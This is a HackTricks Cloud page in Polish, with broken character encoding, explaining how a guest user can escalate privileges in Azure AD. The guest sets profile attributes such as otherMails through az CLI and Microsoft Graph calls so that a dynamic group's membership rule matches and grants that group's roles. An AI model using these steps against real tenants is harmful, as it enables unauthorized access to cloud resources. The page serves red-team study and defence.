# Az - Dynamic Groups Privesc

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Podstawowe informacje

**Dynamiczne grupy** to grupy, ktÃ³re majÄ… skonfigurowany zestaw **reguÅ‚**, a wszyscy **uÅ¼ytkownicy lub urzÄ…dzenia**, ktÃ³re pasujÄ… do tych reguÅ‚, sÄ… dodawani do grupy. Za kaÅ¼dym razem, gdy **atrybut** uÅ¼ytkownika lub urzÄ…dzenia jest **zmieniany**, dynamiczne reguÅ‚y sÄ… **ponownie sprawdzane**. A gdy **nowa reguÅ‚a** jest **tworzona**, wszystkie urzÄ…dzenia i uÅ¼ytkownicy sÄ… **sprawdzani**.

Dynamiczne grupy mogÄ… mieÄ‡ przypisane **role Azure RBAC**, ale **nie jest moÅ¼liwe** dodanie **rÃ³l AzureAD** do dynamicznych grup.

Ta funkcja wymaga licencji Azure AD premium P1.

## Privesc

ZauwaÅ¼, Å¼e domyÅ›lnie kaÅ¼dy uÅ¼ytkownik moÅ¼e zapraszaÄ‡ goÅ›ci w Azure AD, wiÄ™c jeÅ›li reguÅ‚a **dynamicznej grupy** przyznaje **uprawnienia** uÅ¼ytkownikom na podstawie **atrybutÃ³w**, ktÃ³re mogÄ… byÄ‡ **ustawione** w nowym **goÅ›ciu**, moÅ¼liwe jest **utworzenie goÅ›cia** z tymi atrybutami i **eskalacja uprawnieÅ„**. GoÅ›Ä‡ moÅ¼e rÃ³wnieÅ¼ zarzÄ…dzaÄ‡ swoim wÅ‚asnym profilem i zmieniaÄ‡ te atrybuty.

Uzyskaj grupy, ktÃ³re pozwalajÄ… na dynamiczne czÅ‚onkostwo: **`az ad group list --query "[?contains(groupTypes, 'DynamicMembership')]" --output table`**

### PrzykÅ‚ad

* **PrzykÅ‚ad reguÅ‚y**: `(user.otherMails -any (_ -contains "security")) -and (user.userType -eq "guest")`
* **Opis reguÅ‚y**: KaÅ¼dy uÅ¼ytkownik goÅ›Ä‡ z drugim adresem e-mail zawierajÄ…cym ciÄ…g 'security' zostanie dodany do grupy

Dla adresu e-mail uÅ¼ytkownika goÅ›cia, zaakceptuj zaproszenie i sprawdÅº bieÅ¼Ä…ce ustawienia **tego uÅ¼ytkownika** w [https://entra.microsoft.com/#view/Microsoft\_AAD\_IAM/TenantOverview.ReactView](https://entra.microsoft.com/#view/Microsoft_AAD_IAM/TenantOverview.ReactView).\
Niestety strona nie pozwala na modyfikacjÄ™ wartoÅ›ci atrybutÃ³w, wiÄ™c musimy uÅ¼yÄ‡ API:

{% code overflow="wrap" %}
```powershell
# Login with the gust user
az login --allow-no-subscriptions

# Get user object ID
az ad signed-in-user show

# Update otherMails
az rest --method PATCH \
--url "https://graph.microsoft.com/v1.0/users/<user-object-id>" \
--headers 'Content-Type=application/json' \
--body '{"otherMails": ["newemail@example.com", "anotheremail@example.com"]}'

# Verify the update
az rest --method GET \
--url "https://graph.microsoft.com/v1.0/users/<user-object-id>" \
--query "otherMails"
```
{% endcode %}

## Odniesienia

* [https://www.mnemonic.io/resources/blog/abusing-dynamic-groups-in-azure-ad-for-privilege-escalation/](https://www.mnemonic.io/resources/blog/abusing-dynamic-groups-in-azure-ad-for-privilege-escalation/)

{% hint style="success" %}
Ucz siÄ™ i Ä‡wicz Hacking AWS:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Ucz siÄ™ i Ä‡wicz Hacking GCP: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie HackTricks</summary>

* SprawdÅº [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Dziel siÄ™ trikami hackingowymi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriÃ³w github.

</details>
{% endhint %}
